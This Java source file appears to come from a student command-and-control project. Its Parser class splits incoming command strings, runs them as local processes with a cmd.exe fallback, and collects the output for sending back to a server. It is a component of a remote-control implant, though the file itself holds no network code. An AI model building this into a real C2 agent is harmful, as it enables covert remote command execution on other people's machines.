package org.esisar.command_control;

import java.io.IOException;
import java.util.List;
import java.util.ArrayList;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Parser {
    public static java.io.File currentFile = new java.io.File(System.getProperty("user.dir"));
    public static void main(String[] arg) throws IOException {

        String fausseCommande = "dir desktop";
        System.out.println("On envoie au parseur : " + fausseCommande);

        List<String> command = commandSplit(fausseCommande);
        System.out.println("Le parseur a renvoyé : " + command);
        String resultatC2 = executeCommand(command);
        executeCommand(commandSplit("mkdir test"));


        System.out.println("--- CE QUI SERA ENVOYÉ AU SERVEUR ---");
        System.out.println(resultatC2);
    }

    public static List<String> commandSplit(String message){
        List<String> result = new ArrayList<>(); //making a list
        Pattern motif = Pattern.compile("(\"[^\"]+\"|\\S+)");
        Matcher chercheur = motif.matcher(message);

        while (chercheur.find()) {
            String morceau = chercheur.group(1);
            morceau = morceau.replace("\"", "");
            result.add(morceau);
        }
        for (int i = 0; i < result.size(); i++) {
            System.out.println("Case n°" + i + " -> [" + result.get(i) + "]");
        }
        return result;
    }
    private static String lireFlux(Process execute) throws IOException {
        java.io.InputStream flux = execute.getInputStream();
        java.io.BufferedReader lecteur = new java.io.BufferedReader(new java.io.InputStreamReader(flux));
        StringBuilder responses = new StringBuilder();
        String line;
        while ((line = lecteur.readLine()) != null) {
            responses.append(line).append("\n");
        }
        return responses.toString();
    }
    public static String executeCommand(List<String> command) throws IOException {
        try {
            Process execute = new ProcessBuilder(command).directory(currentFile).start();

            return lireFlux(execute);
        } catch (IOException e) {
            if (e.getMessage().contains("error=2")) {

                // On lance le Plan B !
                Process executeFallback = new ProcessBuilder("cmd.exe", "/c" , String.join(" ", command)).directory(currentFile).start();
                return lireFlux(executeFallback);

            } else {
                // Si c'est une autre erreur grave, on la renvoie au serveur
                return "Erreur critique d'exécution : " + e.getMessage() + "\n";
        }
    }



}}